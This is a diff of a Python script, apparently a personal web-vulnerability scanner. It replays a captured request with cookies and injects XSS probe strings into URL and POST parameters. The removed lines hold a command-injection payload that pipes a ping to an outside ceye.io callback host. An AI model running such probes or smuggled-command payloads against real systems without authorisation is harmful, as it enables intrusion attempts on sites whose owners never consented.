@@ -1,85 +1,63 @@
 # coding: utf-8
-'''
-Created on 2018��4��18��
-
-@author: guimaizi
-'''
-import json,re,requests,random,string
+import json,requests
+from urllib import parse
 
 class test_vul:
-    def __init__(self,payload):
-        self.vul_payload=payload
-        f = open('E:/hack/burp_lib/tmp.json', 'r', encoding='utf-8')
-        test=re.sub('\'','\"',f.read())
-        self.data=json.loads(test)
-        print(self.data)
-        if self.data['body']=='':
-            #urllist=self.data['url'].split('?')
-            self.get_data(self.vul_payload)
+    def __init__(self):
+        self.time_out=10
+    def attack_post(self,data):
+        try:
+            kv = {'User-Agent': data['useragent'], 'Cookie': data['cookie'], 'Referer': data['referer'],
+                  "Content-Type": data['Content_Type'],"Accept":data['Accept']}
+            r = requests.post(data['url'],data=data['post'], headers=kv, timeout=self.time_out)
+            return r.text
+        except Exception as e:
+            print('1.0','error : %s--%s' % (data['url'],e))
+    def attack_get(self,data):
+        try:
+            kv = {'User-Agent': data['useragent'], 'Cookie': data['cookie'], 'Referer': data['referer'],
+                  "Content-Type": data['Content_Type'],"Accept":data['Accept']}
+            r = requests.get(data['url'], headers=kv, timeout=self.time_out)
+            return r.text
+        except Exception as e:
+            print('1.0','error : %s--%s' % (data['url'],e))
+    def update_load(self):
+        fw =open('E:/hack/burp_lib/tmp.json',encoding='utf-8')
+        data=json.load(fw)
+        self.get_input(data)
+    def get_input(self,data):
+        print(data)
+        payload_list_url=['\'','"',"\\","<xsssguimaizi>"]
+        for statu in ['url','post']:
+            if statu=='post':
+                statu_num=2
+            else:statu_num=4
+            str_parame=data[statu]
+            bits = list(parse.urlparse(str_parame))
+            qs = parse.parse_qs(bits[statu_num])
+            for i in qs:
+                para = qs[i][0]
+                for payload in payload_list_url:
+                    qs[i]=para+payload
+                    print(i+' : '+qs[i])
+                    bits[statu_num] = parse.urlencode(qs, True)
+                    str_parame = parse.urlunparse(bits)
+                    data[statu]=str_parame
+                    if data['method']==1:
+                        print(i+' : '+qs[i]+self.result_with(self.attack_post(data)))
+                    else:
+                        print(i+' : '+qs[i]+self.result_with(self.attack_get(data)))
+                    qs[i]=para
+                print('-'*20)
+    def result_with(self,data):
+        #print(data)
+        if 'xsssguimaizi' in str(data):
+            data=' --- length: '+str(len(data))+' --- XSS: 1'
         else:
-            self.post_data(self.vul_payload)
-        f.close()
-    def get_data(self,payload):
-        urllist=self.data['url'].split('?')
-        param = urllist[1]
-        param_list = param.split('&')
-        for i in range(len(param_list)):
-            params=list(param_list)
-            j = params[i].split('=')
-            j[1]=j[1] + payload
-            params[i]= '='.join(j)
-            params= '&'.join(params)
-            str=urllist[0] + '?' + params
-            self.attack_get(str)
-    def post_data(self,payload):
-        try:
-            urllist=self.data['url'].split('?')
-            param = urllist[1]
-            param_list = param.split('&')
-            for i in range(len(param_list)):
-                params=list(param_list)
-                j = params[i].split('=')
-                j[1]=j[1] + payload
-                params[i]= '='.join(j)
-                params= '&'.join(params)
-                str=urllist[0] + '?' + params
-                self.attack_post(str,self.data['body'])
-        except:
-            pass
-        param_list = self.data['body'].split('&')
-        for i in range(len(param_list)):
-            params=list(param_list)
-            j = params[i].split('=')
-            j[1]=j[1] + payload
-            params[i]= '='.join(j)
-            params= '&'.join(params)
-            #str=urllist[0] + '?' + params
-            self.attack_post(self.data['url'],params)
-        
-    def attack_post(self,url,data):
-        #print(url)
-        try:
-            kv={'user_agent':self.data['useragent'],'cookie':self.data['cookie'],'referer': self.data['referer'],"Content-Type": "application/x-www-form-urlencoded"}
-            r = requests.post(url,data,headers=kv)
-            if 'xssguimaizi' in r.text:
-                print('\n####xss:%s---%s\n'%(url,data))
-                #print(r.text)
-        except:
-            pass
-    def attack_get(self,url):
-        try:
-            kv={'user_agent':self.data['useragent'],'cookie':self.data['cookie'],'referer': self.data['referer'],"Content-Type": "application/x-www-form-urlencoded"}
-            r = requests.get(url,headers=kv)
-            if 'xssguimaizi' in r.text:
-                print('\n###xss:'+url+'\n')
-        except:
-            pass
-            #print(r.text)
-if '__main__' == __name__:
-    #xss测试
-    xss_payload='<\'\"xssguimaizi>'
-    item=test_vul(xss_payload)
-    #命令注入测试
-    ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 7))
-    cmd_payload='1a | ping %s.pp5vac.ceye.io'%ran_str
-    item=test_vul(cmd_payload)
+            data=' length: '+str(len(data))
+        return data
+if __name__ == '__main__':
+    item=test_vul()
+    item.update_load()
+    #data={'referer': 'http://192.168.0.107/xss_payload/1.php', 'method': 1, 'cookie': '', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.0 Safari/537.36', 'url': 'http://192.168.0.107:80/xss_payload/1.php', 'Content_Type': 'application/x-www-form-urlencoded', 'post': 'dasdas=dasddas&domadsa112n=dasda&domain=dasdasda1223131'}
+    #print(item.attack_post(data))
